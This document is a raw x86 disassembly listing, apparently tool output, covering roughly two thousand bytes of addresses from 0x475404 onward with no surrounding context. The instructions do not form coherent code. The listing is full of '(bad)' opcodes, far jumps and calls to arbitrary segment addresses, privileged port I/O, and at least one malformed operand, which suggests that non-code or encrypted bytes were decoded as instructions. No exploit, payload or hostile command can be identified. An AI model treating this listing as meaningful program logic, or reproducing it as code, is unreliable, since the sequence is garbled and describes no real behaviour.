  475404:	sub    ah,bh
  475406:	jmp    0x475430
  475408:	adc    edi,edi
  47540a:	pop    ss
  47540b:	dec    eax
  47540c:	ret    
  47540d:	xchg   DWORD PTR [eax],edx
  47540f:	arpl   WORD PTR [ecx+esi*8],sp
  475412:	mov    esi,0x82d71d07
  475417:	inc    edx
  475418:	arpl   WORD PTR [eax],dx
  47541a:	dec    ebp
  47541b:	mov    BYTE PTR [eax+0x74],al
  47541e:	test   cl,dh
  475420:	scas   al,BYTE PTR es:[edi]
  475421:	lea    esi,[ecx+edx*4+0x8]
  475425:	mov    bh,0x50
  475427:	ret    0xdcd8
  47542a:	inc    esp
  47542b:	lahf   
  47542c:	cs inc edx
  47542e:	push   cs
  47542f:	or     al,0x63
  475431:	mov    al,0xb
  475433:	add    esi,DWORD PTR [eax-0x9fb7a15]
  475439:	jae    0x47544b
  47543b:	cdq    
  47543c:	add    bh,BYTE PTR [edi+0x22]
  47543f:	mov    dh,0x57
  475441:	ficom  WORD PTR [eax]
  475443:	jne    0x475416
  475445:	mov    bh,BYTE PTR [edx-0x80]
  475448:	loop   0x47548d
  47544a:	and    BYTE PTR es:[eax+0xbb7e260],al
  475451:	bnd jle 0x47545b
  475454:	sbb    DWORD PTR [ecx],ebp
  475456:	mov    al,ds:0xd309e162
  47545b:	mov    bh,0x51
  47545d:	pushf  
  47545e:	call   0xe177e0d7
  475463:	(bad)  
  475465:	mov    al,BYTE PTR [edx+esi*1]
  475468:	inc    ebp
  475469:	jmp    DWORD PTR [edi+ecx*1]
  47546c:	ss jg  0x47544f
  47546f:	add    eax,0x2788ac61
  475474:	and    ebx,DWORD PTR [esi-0x3eac42f0]
  47547a:	jmp    0x8905:0x6261a859
  475481:	sahf   
  475482:	inc    esp
  475483:	xchg   BYTE PTR [edi],dh
  475485:	push   esi
  475486:	inc    ecx
  475487:	pop    eax
  475488:	ret    0x6eb
  47548b:	pop    DWORD PTR [esi+0x37c2fb30]
  475491:	adc    al,0x3b
  475493:	push   0x72ee7504
  475498:	inc    ecx
  475499:	gs call 0xbfee506b
  47549f:	(bad)  
  4754a0:	xor    edi,DWORD PTR [eax-0x76d390c7]
  4754a6:	dec    edx
  4754a7:	mov    DWORD PTR [edi+ebp*8],edx
  4754aa:	sub    ebp,ebx
  4754ac:	or     bh,al
  4754ae:	inc    eax
  4754af:	or     BYTE PTR [esi],bl
  4754b1:	jl     0x4754ca
  4754b3:	hlt    
  4754b4:	pop    edx
  4754b5:	neg    ecx
  4754b7:	jmp    0x485de25d
  4754bc:	shl    BYTE PTR [eax-0x3b9a99dc],0x79
  4754c3:	mov    bl,0x32
  4754c5:	sub    DWORD PTR [esi-0x77],ecx
  4754c8:	sub    DWORD PTR cs:[ebp+0x2c86c02],ecx
  4754cf:	mov    bh,al
  4754d1:	xchg   esp,eax
  4754d2:	adc    DWORD PTR [ebx+0x2f],ecx
  4754d5:	fcomp  DWORD PTR [edx]
  4754d7:	lods   al,BYTE PTR ds:[esi]
  4754d8:	jo     0x4754aa
  4754da:	cmp    al,0xc3
  4754dc:	xor    eax,0x49833ef1
  4754e1:	sub    cl,0x70
  4754e4:	xor    esi,DWORD PTR [eax]
  4754e6:	jbe    0x4754a7
  4754e8:	popf   
  4754e9:	xchg   edx,eax
  4754ea:	xchg   esi,eax
  4754eb:	loope  0x47548d
  4754ed:	fadd   DWORD PTR [ecx+0xc7419fb]
  4754f3:	popa   
  4754f4:	mov    bh,0x80
  4754f6:	or     DWORD PTR [ebx+0xbebe416],eax
  4754fc:	and    DWORD PTR [esi+eax*2],esi
  4754ff:	and    DWORD PTR [ebp+0x2ac6b28],eax
  475505:	enter  0xdf57,0x11
  475509:	or     esp,edi
  47550b:	sbb    DWORD PTR [edx+edx*8+0x19],eax
  47550f:	add    bh,al
  475511:	inc    esi
  475512:	pop    ebx
  475513:	loop   0x47552f
  475515:	inc    ecx
  475516:	jmp    0x8960:0xd502ff3b
  47551d:	mov    ah,0x63
  47551f:	(bad)  
  475520:	rol    BYTE PTR [esi+0x10],1
  475523:	jmp    0x18936947
  475528:	int3   
  475529:	xchg   esp,eax
  47552a:	das    
  47552b:	pop    ecx
  47552c:	mov    bh,0xae
  47552e:	jge    0x4755a2
  475530:	sub    dl,BYTE PTR [edi+0x5]
  475533:	pusha  
  475534:	add    al,0x8e
  475536:	mov    ecx,0x974a7fc6
  47553b:	inc    ecx
  47553c:	xchg   ecx,ebx
  47553e:	mov    eax,0x8b3cc3d5
  475543:	call   0xc66d:0xd38b4bb2
  47554a:	mov    eax,esp
  47554c:	repz shl BYTE PTR [eax],cl
  47554f:	in     eax,dx
  475550:	adc    DWORD PTR [eax],edx
  475552:	adc    al,0x20
  475554:	sub    DWORD PTR [edx+0xb9619bf],esp
  47555a:	pushf  
  47555b:	(bad)  
  47555c:	aas    
  47555d:	inc    eax
  47555e:	push   ebx
  47555f:	push   esi
  475560:	or     dh,dh
  475562:	and    al,0x97
  475564:	imul   edx,DWORD PTR [edi],0x20
  475567:	adc    al,0x50
  475569:	sbb    BYTE PTR [edx+0x37],dl
  47556c:	xor    eax,DWORD PTR [esi+0x1f601b1c]
  475572:	adc    al,0x6f
  475574:	cmp    ebx,DWORD PTR [esi-0x49178b3f]
  47557a:	dec    edi
  47557b:	clc    
  47557c:	cmp    edi,DWORD PTR [ebp+0x20]
  47557f:	test   BYTE PTR [ebx+eiz*4+0x3f19ba9b],al
  475586:	ret    0x2846
  475589:	daa    
  47558a:	aad    0x65
  47558c:	cmp    BYTE PTR [ebp-0x58],al
  47558f:	and    BYTE PTR [eax-0x3f],dh
  475592:	xchg   DWORD PTR [eax],esi
  475594:	dec    esi
  475595:	shl    DWORD PTR [eax+0xf],0x97
  475599:	ret    
  47559a:	les    eax,FWORD PTR [edi+0x24d5077b]
  4755a0:	jp     0x475563
  4755a2:	rcr    BYTE PTR [eax-0x3ede515],0x5f
  4755a9:	in     eax,0x91
  4755ab:	test   BYTE PTR [eax],al
  4755ad:	xchg   edx,eax
  4755ae:	sar    BYTE PTR [eax-0x243c7af9],0x7d
  4755b5:	jbe    0x475571
  4755b7:	sub    al,0x32
  4755b9:	push   ss
  4755ba:	xor    edi,DWORD PTR ss:0xbbd27547
  4755c1:	pop    esi
  4755c2:	fisub  WORD PTR [edi]
  4755c4:	outs   dx,DWORD PTR ds:[esi]
  4755c5:	test   BYTE PTR [eax],cl
  4755c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4755c8:	mov    DWORD PTR [ebp-0x66],edi
  4755cb:	sub    BYTE PTR [eax+0x3b],cl
  4755ce:	rcr    BYTE PTR ds:0xfe4ff8a,1
  4755d4:	xchg   esp,eax
  4755d5:	ret    
  4755d6:	inc    DWORD PTR [ebp+0x1c]
  4755d9:	fsub   QWORD PTR [ecx]
  4755db:	nop
  4755dc:	mov    al,0x3f
  4755de:	jb     0x475610
  4755e0:	push   esi
  4755e1:	or     al,0x43
  4755e3:	dec    DWORD PTR [ebx+0x1c]
  4755e6:	cmp    DWORD PTR [ebx+0x1c],0xffffff92
  4755ea:	or     eax,0xf0881dac
  4755ef:	inc    ebx
  4755f0:	jo     0x475635
  4755f2:	stc    
  4755f3:	ret    
  4755f4:	dec    esp
  4755f5:	mov    ch,0x60
  4755f7:	(bad)  
  4755f8:	in     eax,dx
  4755f9:	adc    BYTE PTR ds:0x77825f04,cl
  4755ff:	sbb    al,0xb4
  475601:	fnstsw WORD PTR [eax-0x28]
  475604:	pop    edx
  475605:	fbld   TBYTE PTR [edx-0x78b84f08]
  47560b:	xor    eax,ecx
  47560d:	xchg   edi,edi
  47560f:	inc    eax
  475610:	or     al,0xbd
  475612:	add    DWORD PTR [ecx],esp
  475614:	lahf   
  475615:	call   0x7424:0x473bfc45
  47561c:	inc    eax
  47561d:	jbe    0x47565b
  47561f:	xchg   ecx,eax
  475620:	ret    
  475621:	mov    WORD PTR [esp-0x8],fs
  475625:	sbb    al,0xeb
  475627:	daa    
  475628:	lea    eax,[edi-0x1d]
  47562b:	cmp    dh,dh
  47562d:	(bad)  
  47562e:	cmp    eax,0xdec7971d
  475633:	daa    
  475634:	mov    edi,0xb055130
  475639:	test   ebx,ebx
  47563b:	dec    ebp
  47563c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47563d:	jb     0x47560c
  47563f:	pop    edx
  475640:	jg     0x475666
  475642:	inc    ebx
  475643:	mov    al,0x5b
  475645:	fisttp DWORD PTR [eax+0xc]
  475648:	cmp    DWORD PTR [eax+0x3c],ecx
  47564b:	sbb    esi,DWORD PTR [ebx+esi*4]
  47564e:	in     eax,dx
  47564f:	inc    ebx
  475650:	xor    al,0xa8
  475652:	ror    eax,cl
  475654:	cmp    ecx,0xb82f4254
  47565a:	or     DWORD PTR [ebx+0x15ac19eb],esi
  475660:	dec    ax
  475662:	pop    ecx
  475663:	dec    eax
  475664:	jl     0x475665
  475666:	call   DWORD PTR [edx+0x71]
  475669:	cmp    dh,BYTE PTR [esi+esi*4+0x10623507]
  475670:	outs   dx,BYTE PTR ds:[esi]
  475671:	push   0xfffffff1
  475673:	mov    eax,ds:0xc6695a34
  475678:	mov    al,0x48
  47567a:	mov    edx,0xf40b4f0a
  47567f:	mov    eax,DWORD PTR [ebx]
  475681:	nop
  475682:	inc    ebx
  475683:	lock test BYTE PTR [edi+0x23],bl
  475687:	arpl   WORD PTR [edx],ax
  475689:	push   es
  47568a:	and    eax,0xbf82c577
  47568f:	xor    eax,0x39d5bfc9
  475694:	xchg   ebx,eax
  475695:	dec    edx
  475696:	lods   al,BYTE PTR ds:[esi]
  475697:	adc    al,0xe8
  475699:	cmp    BYTE PTR [ecx],ah
  47569b:	fdivr  QWORD PTR [edx+0x101b30d0]
  4756a1:	mov    dh,0x6c
  4756a3:	aas    
  4756a4:	arpl   WORD PTR [ecx+0x3b],dx
  4756a7:	lds    esp,FWORD PTR [eax]
  4756a9:	push   ds
  4756aa:	jne    0x4756bf
  4756ac:	cmp    eax,0x1b6221d3
  4756b1:	jne    0x47567c
  4756b3:	xchg   ecx,eax
  4756b4:	(bad)  
  4756b5:	jmp    0x4756fb
  4756b7:	dec    edx
  4756b8:	sahf   
  4756b9:	aad    0xfc
  4756bb:	arpl   WORD PTR [ebp-0x3f68bf6a],sp
  4756c1:	inc    esi
  4756c2:	movd   DWORD PTR [edx+0xf],mm2
  4756c6:	mov    dl,0x81
  4756c8:	fst    DWORD PTR [esi+edx*2]
  4756cb:	sbb    BYTE PTR [edi],dh
  4756cd:	push   edx
  4756ce:	(bad)  
  4756cf:	fnstcw WORD PTR [ebp-0x2]
  4756d2:	stos   DWORD PTR es:[edi],eax
  4756d3:	mov    al,0x86
  4756d5:	je     0x4756f8
  4756d7:	xor    al,0x63
  4756d9:	mov    edx,0xdc100763
  4756de:	out    dx,eax
  4756df:	cmp    eax,DWORD PTR [edi+eiz*8-0x28]
  4756e3:	in     eax,dx
  4756e4:	dec    ecx
  4756e5:	pushf  
  4756e6:	(bad)  
  4756e7:	jmp    0x2ea08adf
  4756ec:	fucomp st(6)
  4756ee:	inc    eax
  4756ef:	imul   eax,edx,0x724ef3b
  4756f5:	cs mov cl,0x5b
  4756f8:	mov    edi,0x4e9e046c
  4756fd:	mov    bl,0x2d
  4756ff:	inc    edx
  475700:	sub    dh,cl
  475702:	cld    
  475703:	bound  ecx,QWORD PTR [esi]
  475705:	push   esp
  475706:	jno    0x4756fc
  475708:	sahf   
  475709:	out    0x3b,al
  47570b:	add    BYTE PTR [esi+0x726c0eec],bl
  475711:	in     al,0x9c
  475713:	jns    0x4756b3
  475715:	idiv   BYTE PTR [ecx-0x24]
  475718:	mov    WORD PTR [eax+0x4e],?
  47571b:	aam    0x40
  47571d:	int3   
  47571e:	sahf   
  47571f:	idiv   DWORD PTR [edi+eiz*8-0x7be13b48]
  475726:	mov    esp,0x7db4d00e
  47572b:	sahf   
  47572c:	out    0x79,eax
  47572e:	adc    BYTE PTR [eax+ebx*1-0x438cfb5c],ch
  475735:	out    0x79,eax
  475737:	fiadd  WORD PTR [esi+0x6894141e]
  47573d:	mov    WORD PTR [esi-0x618610f8],gs
  475743:	test   DWORD PTR [esi+ebp*1+0x747c7ce8],0xbcf73c0e
  47574e:	out    0x3d,eax
  475750:	ins    BYTE PTR es:[edi],dx
  475751:	cs sub al,0x64
  475754:	push   ds
  475755:	or     al,0x5c
  475757:	lahf   
  475758:	call   0x4e54:0xe3df34a
  47575f:	js     0x4757d1
  475761:	dec    esp
  475762:	jo     0x4757a8
  475764:	sti    
  475765:	cmp    al,0xef
  475767:	jns    0x47574d
  475769:	cmp    al,0x9e
  47576b:	fs xor al,0xc4
  47576e:	outs   dx,DWORD PTR ds:[esi]
  47576f:	jbe    0x4757c0
  475771:	pushf  
  475772:	idiv   DWORD PTR [esi+ebx*2+0x283e2400]
  475779:	ss mov edx,0x1cbbdef3
  47577f:	xlat   BYTE PTR ds:[ebx]
  475780:	sbb    DWORD PTR [ecx],eax
  475782:	or     al,0xcb
  475784:	push   ss
  475785:	sbb    BYTE PTR [esi-0x8],cl
  475788:	add    DWORD PTR [edx+ecx*8],edx
  47578b:	leave  
  47578c:	sbb    edi,ecx
  47578e:	push   ss
  47578f:	pop    eax
  475790:	jb     0x4757a2
  475792:	ror    BYTE PTR cs:[edx+esi*8],1
  475796:	pushf  
  475797:	cmp    al,0xb3
  475799:	jo     0x4757b2
  47579b:	or     BYTE PTR [eax+0x4],dl
  47579e:	adc    BYTE PTR [ebx+0x77c8e6],dl
  4757a4:	mov    fs,WORD PTR [ecx+esi*2]
  4757a7:	cld    
  4757a8:	popa   
  4757a9:	add    al,0x73
  4757ab:	sar    BYTE PTR [ebp+edi*4+0x475416f8],cl
  4757b2:	hlt    
  4757b3:	popa   
  4757b4:	fdivr  st(0),st
  4757b6:	jns    0x475806
  4757b8:	fmulp  st(1),st
  4757ba:	cwde   
  4757bb:	in     al,dx
  4757bc:	push   ss
  4757bd:	mov    al,ch
  4757bf:	sbb    al,0x4e
  4757c1:	fmulp  st(1),st
  4757c3:	cmp    esp,esp
  4757c5:	pop    esi
  4757c6:	or     al,0xe0
  4757c8:	mov    es,eax
  4757ca:	fsubr  st(7),st
  4757cc:	in     al,0x19
  4757ce:	stc    
  4757cf:	pop    esi
  4757d0:	int3   
  4757d1:	outs   dx,DWORD PTR ds:[esi]
  4757d2:	fadd   DWORD PTR [esp+edx*8-0x6c61b10e]
  4757d9:	lods   al,BYTE PTR ds:[esi]
  4757da:	shl    BYTE PTR [eax-0x637fd134],1
  4757e0:	mov    esp,0x16c87793
  4757e5:	lock les edi,FWORD PTR [esi-0x36213f68]
  4757ec:	jae    0x4757e0
  4757ee:	in     al,0xbc
  4757f0:	enter  0x46b8,0x48
  4757f4:	in     al,0x19
  4757f6:	stc    
  4757f7:	dec    esi
  4757f8:	mov    ah,0xee
  4757fa:	and    BYTE PTR [ebx-0x50],dh
  4757fd:	rcr    BYTE PTR [esp+edi*1-0x715310d9],1
  475804:	fsubr  DWORD PTR [eax-0x6c435b8c]
  47580a:	ja     0x4757fe
  47580c:	fsub   QWORD PTR [eax-0x71633fa2]
  475812:	mov    al,ds:0x9de4e793
  475817:	cwde   
  475818:	pop    esi
  475819:	sbb    BYTE PTR [esp+esi*4-0x43630d89],dl
  475820:	nop
  475821:	mov    esi,0x88d48cf8
  475826:	jbe    0x47580c
  475828:	popf   
  475829:	mov    esp,0x2e645093
  47582e:	xor    al,0x60
  475830:	mov    es,WORD PTR [eax-0x3f7c6379]
  475836:	pop    edi
  475837:	test   eax,0x3a4f90da
  47583c:	clc    
  47583d:	dec    eax
  47583e:	jb     0x4757c5
  475840:	dec    edx
  475841:	add    DWORD PTR [eax-0x743b1264],esp
  475847:	push   edi
  475848:	faddp  st(5),st
  47584a:	adc    BYTE PTR [eax],cl
  47584c:	shl    BYTE PTR [edx+0x7a58b894],0xb9
  475853:	push   ss
  475854:	std    
  475855:	dec    esp
  475856:	loope  0x47581e
  475858:	(bad)
  47585c:	icebp  
  47585d:	mov    eax,0xf20e7920
  475862:	shr    BYTE PTR [ecx],cl
  475864:	pop    es
  475865:	call   0x2a89126
  47586a:	sub    al,0x71
  47586c:	push   es
  47586d:	jns    0x475803
  47586f:	adc    BYTE PTR [eax*8+0x60005],ch
  475876:	les    edi,FWORD PTR [ebx+0x3df21ef6]
  47587c:	pop    eax
  47587d:	mov    eax,0x50341f88
  475882:	xchg   DWORD PTR [edi-0x3fcdff83],esp
  475888:	es and al,0x29
  47588b:	or     BYTE PTR [ebx],ch
  47588d:	mov    ecx,0x86d8e790
  475892:	or     al,0xa8
  475894:	cmp    DWORD PTR [esi-0x3f],esi
  475897:	sbb    bl,al
  475899:	and    eax,0xe49c13a0
  47589e:	nop
  47589f:	inc    ebx
  4758a0:	push   cs
  4758a1:	cwde   
  4758a2:	nop
  4758a3:	mov    eax,cs
  4758a5:	and    BYTE PTR [edi],cl
  4758a7:	cmp    DWORD PTR [eax+0x30c060d4],eax
  4758ad:	adc    DWORD PTR [eax],ecx
  4758af:	sti    
  4758b0:	cmp    al,BYTE PTR [eax+edi*4-0x6f00d844]
  4758b7:	aaa    
  4758b8:	or     al,0xe4
  4758ba:	mov    al,0xda
  4758bc:	call   FWORD PTR [ebx+ebx*8]
  4758bf:	int    0xf
  4758c1:	mov    edi,0x12d8372
  4758c6:	jae    0x475908
  4758c8:	mov    eax,0x3113d664
  4758cd:	dec    eax
  4758ce:	xlat   BYTE PTR ds:[ebx]
  4758cf:	push   cs
  4758d0:	dec    esi
  4758d1:	frstor [edi+0x13]
  4758d4:	jo     0x475856
  4758d6:	cmp    eax,0x8c86de61
  4758db:	push   ss
  4758dc:	xchg   ecx,eax
  4758dd:	sbb    eax,0xdb300e00
  4758e2:	xor    eax,DWORD PTR [ebx-0x42]
  4758e5:	retf   0x108b
  4758e8:	push   eax
  4758e9:	mov    bl,0x14
  4758eb:	cmp    al,0xe4
  4758ed:	mov    ebx,0x8dd38b8
  4758f2:	enter  0xdb23,0x77
  4758f6:	xor    BYTE PTR [eax-0x1c],bh
  4758f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4758fa:	sub    edi,edx
  4758fc:	(bad)  
  4758fd:	ror    BYTE PTR [esi],1
  4758ff:	int3   
  475900:	enter  0xd63f,0x77
  475904:	jecxz  0x4758ca
  475906:	das    
  475907:	cmp    DWORD PTR [ebp+0x10],0xb80774bc
  47590e:	add    esi,ebx
  475910:	rol    eax,0x66
  475913:	nop
  475914:	xchg   BYTE PTR [edi],dl
  475916:	data16 or al,0x8
  475919:	adc    al,0xb2
  47591b:	jg     0x4758be
  47591d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47591e:	pop    ds
  47591f:	fmulp  st(3),st
  475921:	dec    eax
  475922:	pop    ebp
  475923:	ret    0x5f14
  475926:	leave  
  475927:	sub    eax,0xe74df1a5
  47592c:	pop    ss
  47592d:	or     al,0xb2
  47592f:	rol    DWORD PTR [edi],0x6c
  475932:	cwde   
  475933:	mov    edi,0x88dc02ed
  475938:	retf   
  475939:	dec    eax
  47593a:	or     ecx,eax
  47593c:	or     al,0xbb
  47593e:	and    BYTE PTR [ecx+0x13387b81],dh
  475944:	ss sub al,0x8b
  475947:	adc    eax,0x46074b1
  47594c:	add    edi,esi
  47594e:	xor    dh,BYTE PTR [edx+0x1c]
  475951:	test   DWORD PTR [eax],edx
  475953:	(bad)  
  475954:	adc    BYTE PTR [ebx+0x72],dl
  475957:	mov    eax,0xc3dc0937
  47595c:	adc    BYTE PTR [edx],dh
  47595e:	fwait
  47595f:	jl     0x47596f
  475961:	adc    bh,dl
  475963:	outs   dx,BYTE PTR ds:[esi]
  475964:	and    DWORD PTR [eax+0x2488792b],edx
  47596a:	jne    0x4759c8
  47596c:	leave  
  47596d:	adc    DWORD PTR [eax-0x1e077826],0x7
  475974:	inc    edx
  475975:	push   cs
  475976:	add    DWORD PTR [esi-0x23],0xb9a8a2
  47597d:	jns    0x4759a4
  47597f:	dec    ebp
  475980:	fnsave [edx+0x83c95c9]
  475986:	mov    BYTE PTR [eax-0x47],dl
  475989:	mov    ebx,0xe42914a
  47598e:	clc    
  47598f:	clc    
  475990:	jecxz  0x4759c3
  475992:	fimul  WORD PTR [edi-0x2e]
  475995:	pop    esp
  475996:	and    BYTE PTR ds:0x558df8f8,ch
  47599c:	pop    es
  47599d:	jmp    DWORD PTR [edi+ebx*4]
  4759a0:	push   DWORD PTR [ebp+0x4c]
  4759a3:	cmp    BYTE PTR [ebp-0x1],0x1
  4759a7:	cmc    
  4759a8:	sbb    eax,eax
  4759aa:	adc    al,0x66
  4759ac:	mov    WORD PTR [edx+esi*8-0x2fd7628],fs
  4759b3:	cmp    dh,bl
  4759b5:	clc    
  4759b6:	jo     0x47597c
  4759b8:	sub    BYTE PTR [ecx],dl
  4759ba:	xlat   BYTE PTR ds:[ebx]
  4759bb:	ret    0x7228
  4759be:	dec    ecx
  4759bf:	xor    DWORD PTR [ebx],0xffffff80
  4759c2:	or     DWORD PTR [eax+edx*1+0x34a7600],esp
  4759c9:	sbb    eax,DWORD PTR [ecx]
  4759cb:	cmp    BYTE PTR [ebp+0x70338e8d],0x84
  4759d2:	jb     0x47599c
  4759d4:	and    ebx,eax
  4759d6:	dec    ecx
  4759d7:	mov    DWORD PTR [ebx],esi
  4759d9:	fninit 
  4759db:	stos   DWORD PTR es:[edi],eax
  4759dc:	fidivr WORD PTR [ecx-0x40]
  4759df:	call   0xdf14:0xdf906042
  4759e6:	cmp    DWORD PTR [ecx-0x7b66ffe4],eax
  4759ec:	sbb    ebx,edi
  4759ee:	or     al,0x7
  4759f0:	in     al,0x2a
  4759f2:	adc    al,0x88
  4759f4:	(bad)  
  4759f6:	sbb    edx,DWORD PTR [esi+0x41]
  4759f9:	pop    ss
  4759fa:	pop    ds
  4759fb:	sub    BYTE PTR [eax],cl
  4759fd:	add    DWORD PTR [eax-0x41b772c0],ecx
  475a03:	das    
  475a04:	mov    DWORD PTR [ebp+0x1b],ecx
  475a07:	jne    0x4759f1
  475a09:	out    0x14,eax
  475a0b:	je     0x4759a6
  475a0d:	and    esp,DWORD PTR [edi+ecx*4+0x10]
  475a11:	mov    al,0x83
  475a14:	pushf  
  475a15:	pushf  
  475a16:	pushf  
  475a17:	mov    esp,0x6351b4b8
  475a1c:	sub    DWORD PTR [ecx+eax*1+0x57],edi
  475a20:	scas   al,BYTE PTR es:[edi]
  475a21:	ins    BYTE PTR es:[edi],dx
  475a22:	cwde   
  475a23:	and    BYTE PTR [edi-0xf],0xba
  475a27:	bound  ebx,QWORD PTR [ecx]
  475a29:	sub    eax,0x3879d7f1
  475a2e:	xchg   ebp,eax
  475a2f:	pop    fs
  475a31:	test   bh,ch
  475a33:	add    eax,DWORD PTR [ebx-0x4]
  475a36:	xchg   edi,eax
  475a37:	push   ecx
  475a38:	push   0x4bf00fe8
  475a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  475a3e:	loope  0x475aa5
  475a40:	inc    esp
  475a41:	push   ebp
  475a42:	mov    edx,0xf8b8d654
  475a47:	dec    edx
  475a48:	xor    esp,eax
  475a4a:	addr16 and eax,0xa359b4cf
  475a50:	mov    al,ds:0x93842a96
  475a55:	dec    esp
  475a56:	jb     0x475a20
  475a58:	or     al,0xe2
  475a5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  475a5b:	adc    al,0xa8
  475a5d:	and    al,0x93
  475a5f:	push   esp
  475a60:	cs nop
  475a62:	sbb    al,0xac
  475a64:	xchg   ebx,eax
  475a65:	dec    esp
  475a66:	xor    cl,cl
  475a68:	and    al,0xb0
  475a6a:	sub    al,0xb4
  475a6c:	dec    esp
  475a6d:	xor    cl,cl
  475a6f:	and    al,0x34
  475a71:	mov    eax,0x24c9323c
  475a76:	xchg   ebx,eax
  475a77:	mov    esp,0x24c9c044
  475a7c:	xchg   ebx,eax
  475a7d:	dec    esp
  475a7e:	dec    esp
  475a7f:	les    edx,FWORD PTR [esi+ebp*1-0x6d]
  475a83:	dec    esp
  475a84:	xor    cl,al
  475a86:	pop    esp
  475a87:	int3   
  475a88:	pushf  
  475a89:	push   esp
  475a8a:	cs xchg ebx,eax
  475a8c:	push   esp
  475a8d:	shr    BYTE PTR fs:[eax+0x2f3c936c],1
  475a94:	xchg   ebx,eax
  475a95:	aam    0x14
  475a97:	fdivr  QWORD PTR [eax+ebx*8+0x2e]
  475a9b:	xchg   ebx,eax
  475a9c:	push   esp
  475a9d:	or     BYTE PTR cs:[esp+ebx*8-0x6cd0c314],0x54
  475aa6:	pushf  
  475aa7:	loopne 0x475b01
  475aa9:	(bad)  [ebx+edx*4-0x1b6cd1ac]
  475ab0:	les    edi,FWORD PTR [eax+ebp*8+0x2f3c932e]
  475ab7:	inc    esp
  475ab8:	fmulp  st(4),st
  475aba:	in     al,dx
  475abb:	mov    ah,0x3c
  475abd:	das    
  475abe:	xchg   ebx,eax
  475abf:	push   esp
  475ac0:	fdivr  st(0),st
  475ac2:	and    al,0xdf
  475ac4:	in     al,dx
  475ac5:	mov    ah,0xb1
  475ac7:	cmp    BYTE PTR [ebx+0x3022f0f4],dl
  475acd:	inc    esi
  475ace:	mov    ebp,0xdf7475be
  475ad3:	jmp    0x6843:0x4327026b
  475ada:	sub    dl,BYTE PTR [ecx+edi*2+0x70]
  475ade:	jl     0x475ad9
  475ae0:	mov    ebp,0x4e27e033
  475ae5:	add    BYTE PTR gs:[bx],cl
  475ae9:	outs   dx,DWORD PTR ds:[esi]
  475aea:	je     0x475b2d
  475aec:	fs fs das 
  475aef:	pop    edi
  475af0:	(bad)  
  475af1:	mov    esi,0x2f627553
  475af6:	dec    ebp
  475af7:	jne    0x475b65
  475af9:	inc    esp
  475afa:	imul   esi,DWORD PTR [esi+0x49],0xd991e564
  475b01:	retf   
  475b02:	imul   esi,DWORD PTR [esi+0x6f],0x4f6e5f64
  475b09:	jb     0x475b0b
  475b0b:	out    dx,al
  475b0c:	pop    ds
  475b0d:	stc    
  475b0e:	repnz pop eax
  475b10:	outs   dx,DWORD PTR ds:[esi]
  475b11:	jb     0x475b56
  475b13:	ins    DWORD PTR es:[edi],dx
  475b14:	jo     0x475b4a
  475b16:	inc    esi
  475b17:	jb     0x475b88
  475b19:	ins    DWORD PTR es:[edi],dx
  475b1a:	push   ebx
  475b1b:	je     0x475b47
  475b1d:	cwde   
  475b1e:	nop
  475b1f:	and    ecx,edi
  475b21:	pop    ds
  475b22:	push   edx
  475b23:	cmp    BYTE PTR [eax+ebx*8+0x6c],al
  475b27:	adc    ecx,DWORD PTR [ecx+0x4a]
  475b2a:	and    ecx,DWORD PTR [edi+0x36073f79]
  475b30:	mov    dh,0x91
  475b32:	jo     0x475b73
  475b34:	inc    edx
  475b35:	jae    0x475b1d
  475b37:	push   es
  475b38:	jb     0x475ba1
  475b3a:	adc    BYTE PTR [edi],bl
  475b3c:	inc    ebx
  475b3d:	jns    0x475b3f
  475b3f:	(bad)  
  475b40:	pop    ds
  475b41:	pop    esi
  475b42:	rol    BYTE PTR gs:0xe321ef6f,0xb
  475b4a:	cmp    ecx,ecx
  475b4c:	inc    ebx
  475b4d:	clc    
  475b4e:	xchg   DWORD PTR [eax],ebp
  475b50:	jecxz  0x475b82
  475b52:	jne    0x475b3c
  475b54:	test   eax,edi
  475b56:	int    0x5
  475b58:	mov    ch,0xec
  475b5a:	xchg   esi,eax
  475b5b:	das    
  475b5c:	pusha  
  475b5d:	pop    esp
  475b5e:	(bad)  
  475b60:	idiv   edi
  475b62:	out    dx,eax
  475b63:	cmp    eax,0x1920bdf6
  475b68:	pop    edx
  475b69:	cli    
  475b6a:	jo     0x475b7f
  475b6c:	jl     0x475bab
  475b6e:	or     BYTE PTR [edx+0x6],0x54
  475b72:	in     al,0x1
  475b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  475b75:	(bad)  
  475b76:	jecxz  0x475b69
  475b78:	pop    esi
  475b79:	jecxz  0x475b02
  475b7b:	fdivr  DWORD PTR [ebp+0x1ad8be36]
  475b81:	push   0x6
  475b83:	add    DWORD PTR [esp+eiz*8],edx
  475b86:	jl     0x475b33
  475b88:	add    ebx,DWORD PTR cs:[edi-0x18bef6da]
  475b8f:	jns    0x475b2f
  475b91:	(bad)  
  475b92:	or     al,BYTE PTR [esi]
  475b94:	sbb    BYTE PTR [esp+ebp*1+0x68],cl
  475b98:	mov    ecx,0x149f34f9
  475b9d:	mov    BYTE PTR [eax],cl
  475b9f:	ror    BYTE PTR [ecx+ecx*1+0x74],0x2e
  475ba4:	inc    eax
  475ba5:	loope  0x475b96
  475ba7:	mov    ecx,0x601e7c77
  475bac:	aas    
  475bad:	or     BYTE PTR es:[esi],al
  475bb0:	adc    dl,BYTE PTR [ebx+eax*2+0x75]
  475bb4:	mov    bh,0xc7
  475bb6:	push   cs
  475bb7:	or     DWORD PTR [esi+0x48],0x47
  475bbb:	cmp    edx,DWORD PTR [eax-0x26a909d4]
  475bc1:	pusha  
  475bc2:	mov    ch,0x7
  475bc4:	xor    DWORD PTR [edi-0xc],esp
  475bc7:	adc    BYTE PTR [eax],cl
  475bc9:	sub    edx,DWORD PTR [ebp+0x4]
  475bcc:	or     al,0xc0
  475bce:	inc    eax
  475bcf:	push   es
  475bd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  475bd1:	and    eax,0xe4920f2f
  475bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  475bd7:	in     al,0x8
  475bd9:	jnp    0x475c0b
  475bdb:	sbb    al,bl
  475bdd:	push   ds
  475bde:	push   ss
  475bdf:	inc    ebp
  475be0:	mov    ch,0x6d
